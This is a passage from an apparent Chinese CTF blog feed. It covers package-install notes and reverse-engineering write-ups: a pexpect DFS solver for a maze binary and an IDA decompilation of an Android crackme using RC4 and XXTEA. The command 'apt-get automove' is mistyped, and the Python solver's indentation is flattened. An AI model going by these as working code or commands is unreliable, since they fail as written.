readline-devel.i686</span><br></pre></td></tr></table></figure><p>真的！！激动小一会。😂。</p><p>这其实也是看到64位已经安装的提示有了这样的猜测：</p><p><img src="/2021/08/01/DASCTF-July-X-CBCTF-4th/image-20210805222911664.png" alt="image-20210805222911664"></p><p>而为什么要加.686呢？</p><p><strong>i386对应的是32位系统、而i686是i386的一个子集,i686仅对应P6及以上级别的CPU，i386则广泛适用于80386以上的各种CPU；x86_64主要是64位系统。</strong></p><p>经过上面的折腾也熟悉了下apt-get自动清理无用包的命令：</p><p>ubuntu下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get automove <span class="comment">#但有一定风险</span></span><br><span class="line">sudo apt-get autoclean</span><br></pre></td></tr></table></figure><p>centos下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum clean all <span class="comment">#清空yum缓存</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021巅峰极客</title>
      <link href="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>逆向题解~<a id="more"></a></p><h3 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h3><p>常见的迷宫题，但考法却不常见，没有直接的地图，只是给出每走一步的程序的反馈，提示是否遇到障碍，是否到可以通行，是否到达终点。</p><p>程序就是通过每走一步，调用一个函数。</p><p>感觉上方法很多的，这里我是采用与程序交互写一个dfs来跑。</p><p>首先交互采用的pexpect模块，然后把程序中提示正确信息的字符串都改为：“1\r\n”，到达终点的字符串改为了：“2\r\n”，方便判断交互数据。</p><p>其次写这个dfs来与程序交互跑迷宫和常规的有地图自己跑要注意一点，<strong>在每次走一步后返回到上一层的时候要加一个步骤：往回走的步骤</strong>，因为这是在程序交互。</p><p>刚开始我写这个迷宫，以为程序可能就是几十步吧，所以也没有去做什么过滤，后面跑的时候发现步数远不止几十，，起码上百，说明这个地图是很大的，这样直接跑时间上肯定是不行的。。</p><p>接下来改进，想到我可以开始初始化一个大的迷宫，让程序在跑的时候根据回显是障碍物来在初始化的迷宫上记录这是一个障碍点（maze[x][y] = 1）。</p><p>最后程序在10分钟跑出了结果，勉强能接受，虽然还是很慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">next = [[<span class="number">0</span>, <span class="number">-1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>,<span class="number">1</span>], [<span class="number">-1</span>, <span class="number">0</span>]]</span><br><span class="line">d = <span class="string">"ASDW"</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line">back = &#123;<span class="string">'W'</span>:<span class="string">'S'</span>, <span class="string">'S'</span>:<span class="string">'W'</span>, <span class="string">'A'</span>:<span class="string">'D'</span>, <span class="string">'D'</span>:<span class="string">'A'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_str</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    s += i</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(step, x, y)</span>:</span></span><br><span class="line">print(do_str(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="comment">#print(do_str(flag))</span></span><br><span class="line">flag[step] = d[i]</span><br><span class="line">flag[step+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">nx = x+next[i][<span class="number">0</span>]</span><br><span class="line">ny = y+next[i][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> maze[nx][ny] == <span class="number">1</span> <span class="keyword">or</span> book[nx][ny] == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">r.sendline(d[i])</span><br><span class="line">ans = r.readline()</span><br><span class="line"><span class="comment">#print(ans)</span></span><br><span class="line"><span class="keyword">if</span> ans == <span class="string">b'1\r\n'</span>:</span><br><span class="line">book[nx][ny] = <span class="number">1</span></span><br><span class="line">dfs(step+<span class="number">1</span>, nx, ny)</span><br><span class="line">book[nx][ny] = <span class="number">0</span></span><br><span class="line">r.sendline(back[d[i]])</span><br><span class="line">r.readline()</span><br><span class="line"><span class="keyword">elif</span> ans == <span class="string">b'2\r\n'</span>:</span><br><span class="line">print(<span class="string">"found: "</span>, do_str(flag))</span><br><span class="line">t1 = time()</span><br><span class="line">print(<span class="string">"time: "</span>, t1-t)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">maze[nx][ny] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">t = time()</span><br><span class="line">maze=[[<span class="number">0</span>]*<span class="number">1000</span>]*<span class="number">1000</span></span><br><span class="line">book=[[<span class="number">0</span>]*<span class="number">1000</span>]*<span class="number">1000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">book[i]=[<span class="number">0</span>]*<span class="number">1000</span></span><br><span class="line">r = pexpect.spawn(<span class="string">'./maze'</span>)</span><br><span class="line">r.readline()</span><br><span class="line">r.readline()</span><br><span class="line">ans = r.readline()</span><br><span class="line">print(ans)</span><br><span class="line">maze[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">maze[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="string">'S'</span></span><br><span class="line">r.sendline(<span class="string">'S'</span>)</span><br><span class="line">ans = r.readline()</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">found:  SSSSSSSSSDDDDDDWWWWAAWWAAWWDDDDDDDDDDDDDDDDDDDDSSDDSSAASSSSAAAAWWAAWWWWAASSSSSSAASSDDSSSSDDWWWWDDSSDDDDWWDDDDDDWWAAAAWWDDDDWWAAWWWWDDSSDDSSSSSSSSSSDDDDSSAAAASSSSSSAASSSSAAWWAASSSSDDDDDDDDDDSSDDSSAASSSSAASSSSSSSSDDWWWWWWDDWWWWDDWWWWDDSSSSSSSSAASSSSDDDDSSDDDDWWDDSSDDSSDDDDDDDDSSDDSSSSDDDDSSDDSSSSSSDDSSSSDDDDSSSSDDDDDDSSSSDDSSDSSASSSSAASSDDSSAASSDDDDDDSSDDDDWWDDSSSSSSDDDDWWAAWWWWDDDDSSSSDDDDDDSSAASSSSSSDDDDDDDDSSDDDDSSSSSSDDWWDDDDDDSSSSSSSSAASSDDSSSSSSAASSDDS</span><br><span class="line">time:  655.1350808143616</span><br></pre></td></tr></table></figure><h3 id="medical-app"><a href="#medical-app" class="headerlink" title="medical_app"></a>medical_app</h3><p>算是很常规的一个安卓题了，就native层逻辑很明显的加密。</p><p>做的时候发现这个不同架构的so去ida反编译的结果区别真的大，，没有经验，我开始选择了熟悉的x86架构的去看😅：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">cdecl <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v22; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v23; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [esp+8h] [ebp-264h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v28; <span class="comment">// [esp+Ch] [ebp-260h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// [esp+10h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+10h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v31; <span class="comment">// [esp+14h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+14h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v33; <span class="comment">// [esp+18h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+18h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v35; <span class="comment">// [esp+1Ch] [ebp-250h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v36; <span class="comment">// [esp+20h] [ebp-24Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// [esp+24h] [ebp-248h]</span></span><br><span class="line">  <span class="keyword">char</span> *v38; <span class="comment">// [esp+2Ch] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v39; <span class="comment">// [esp+30h] [ebp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+34h] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v41; <span class="comment">// [esp+38h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">int</span> v42; <span class="comment">// [esp+40h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v43; <span class="comment">// [esp+4Ch] [ebp-220h]</span></span><br><span class="line">  _OWORD v44[<span class="number">16</span>]; <span class="comment">// [esp+50h] [ebp-21Ch]</span></span><br><span class="line">  _OWORD v45[<span class="number">17</span>]; <span class="comment">// [esp+150h] [ebp-11Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v3);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = (<span class="keyword">char</span> *)v3;</span><br><span class="line">    v44[<span class="number">15</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">14</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">13</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">12</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">11</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">10</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">9</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">7</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">6</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">5</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v44[<span class="number">0</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">15</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">14</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">13</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">12</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">11</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">10</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">9</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">7</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">6</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">5</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">4</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">3</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">    v45[<span class="number">0</span>] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v44 + v5) = v5;</span><br><span class="line">      *((_BYTE *)v45 + v5) = *((_BYTE *)&amp;d + (v5 &amp; <span class="number">0xF</span>));</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">256</span> );</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">-256</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> __int8 *)v45 + v7);</span><br><span class="line">      v9 = v8 + v6;</span><br><span class="line">      v10 = *((<span class="keyword">char</span> *)&amp;v45[<span class="number">16</span>] + v7);</span><br><span class="line">      v11 = v10 + v9 + <span class="number">255</span>;</span><br><span class="line">      v12 = v10 + v9;</span><br><span class="line">      <span class="keyword">if</span> ( v12 &gt;= <span class="number">0</span> )</span><br><span class="line">        v11 = v12;</span><br><span class="line">      v6 = v12 - (v11 &amp; <span class="number">0xFFFFFF00</span>);</span><br><span class="line">      *((_BYTE *)v45 + v7) = *((_BYTE *)v44 + v6);</span><br><span class="line">      *((_BYTE *)v44 + v6) = v8;</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 );</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v14 = <span class="number">-36</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v13 + <span class="number">256</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)(v13 + <span class="number">1</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        v16 = v13 + <span class="number">1</span>;</span><br><span class="line">      v13 = v13 - (v16 &amp; <span class="number">0xFFFFFF00</span>) + <span class="number">1</span>;</span><br><span class="line">      v17 = *((<span class="keyword">unsigned</span> __int8 *)v44 + v13);</span><br><span class="line">      v18 = v15 + v17 + <span class="number">255</span>;</span><br><span class="line">      v19 = v17 + v15;</span><br><span class="line">      <span class="keyword">if</span> ( v19 &gt;= <span class="number">0</span> )</span><br><span class="line">        v18 = v19;</span><br><span class="line">      v15 = v19 - (v18 &amp; <span class="number">0xFFFFFF00</span>);</span><br><span class="line">      v20 = v14;</span><br><span class="line">      *((_BYTE *)v44 + v13) = *((_BYTE *)v44 + v15);</span><br><span class="line">      *((_BYTE *)v44 + v15) = v17;</span><br><span class="line">      v38[v14 + <span class="number">36</span>] ^= *((_BYTE *)v44 + (<span class="keyword">unsigned</span> __int8)(v17 + *((_BYTE *)v44 + v13)));</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v20 != <span class="number">-1</span> );</span><br><span class="line">    v21 = *((_DWORD *)v38 + <span class="number">8</span>);</span><br><span class="line">    v37 = *(_DWORD *)v38;</span><br><span class="line">    v22 = *((_DWORD *)v38 + <span class="number">1</span>);</span><br><span class="line">    v27 = *((_DWORD *)v38 + <span class="number">3</span>);</span><br><span class="line">    v28 = *((_DWORD *)v38 + <span class="number">4</span>);</span><br><span class="line">    v31 = *((_DWORD *)v38 + <span class="number">5</span>);</span><br><span class="line">    v33 = *((_DWORD *)v38 + <span class="number">6</span>);</span><br><span class="line">    v39 = *((_DWORD *)v38 + <span class="number">2</span>);</span><br><span class="line">    v29 = *((_DWORD *)v38 + <span class="number">7</span>);</span><br><span class="line">    v43 = <span class="number">-11</span>;</span><br><span class="line">    v23 = <span class="number">-1621657930</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v40 = (v23 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      v42 = *((_DWORD *)&amp;d + v40);</span><br><span class="line">      v37 += (((v21 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v22)) + ((v22 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v21))) ^ ((v23 ^ v22) + (v42 ^ v21));</span><br><span class="line">      v41 = v31;</span><br><span class="line">      v32 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">1</span>));</span><br><span class="line">      v22 += (((v37 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v39)) + ((v39 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v37))) ^ ((v23 ^ v39) + (v37 ^ v32));</span><br><span class="line">      v36 = v33;</span><br><span class="line">      v34 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">2</span>));</span><br><span class="line">      v24 = v39 + ((((v22 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v27)) + ((v27 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v22))) ^ ((v23 ^ v27) + (v22 ^ v34)));</span><br><span class="line">      v35 = v29;</span><br><span class="line">      v30 = *((_DWORD *)&amp;d + (v40 ^ <span class="number">3</span>));</span><br><span class="line">      v39 = v24;</span><br><span class="line">      v27 += (((v24 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v28)) + ((v28 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v24))) ^ ((v23 ^ v28) + (v24 ^ v30));</span><br><span class="line">      v25 = v28 + ((((v27 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v41)) + ((v41 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v27))) ^ ((v23 ^ v41) + (v27 ^ v42)));</span><br><span class="line">      v28 = v25;</span><br><span class="line">      v31 = v41 + ((((v25 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v36)) + ((v36 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v25))) ^ ((v23 ^ v36) + (v25 ^ v32)));</span><br><span class="line">      v33 = v36 + ((((v31 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v35)) + ((v35 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v31))) ^ ((v23 ^ v35) + (v31 ^ v34)));</span><br><span class="line">      v29 = v35 + ((((v33 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v21)) + ((v21 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v33))) ^ ((v23 ^ v21) + (v33 ^ v30)));</span><br><span class="line">      v21 += (((v29 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v37)) + ((v37 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v29))) ^ ((v23 ^ v37) + (v29 ^ v42));</span><br><span class="line">      v23 -= <span class="number">1621657930</span>;</span><br><span class="line">      ++v43;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v43 );</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">1</span>) = v22;</span><br><span class="line">    *(_DWORD *)v38 = v37;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">2</span>) = v24;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">3</span>) = v27;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">4</span>) = v25;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">5</span>) = v31;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">7</span>) = v29;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">6</span>) = v33;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">8</span>) = v21;</span><br><span class="line">    LOBYTE(v5) = <span class="built_in">memcmp</span>(v38, &amp;unk_3440, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和之前看release模式编译的800多行c++代码比起来，其实还好。很明显开始一个rc4加密，接着一个tea，仔细看下，可以知道是xxtea。</p><p>然后有几个函数，看得出来是加密函数，但没有引用关系。但这样看，不好看出这个xxtea是否经过魔改。</p><p>所以我决定去看下armV7的so，然后调试一波，感觉发现了新天地，，这清晰的加密流程。。从这才知道不同版本的so反编译结果如此之大，其实这个armV7的so应该才是作者自己写的，以后看so的时候应该首先armV7的so。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span 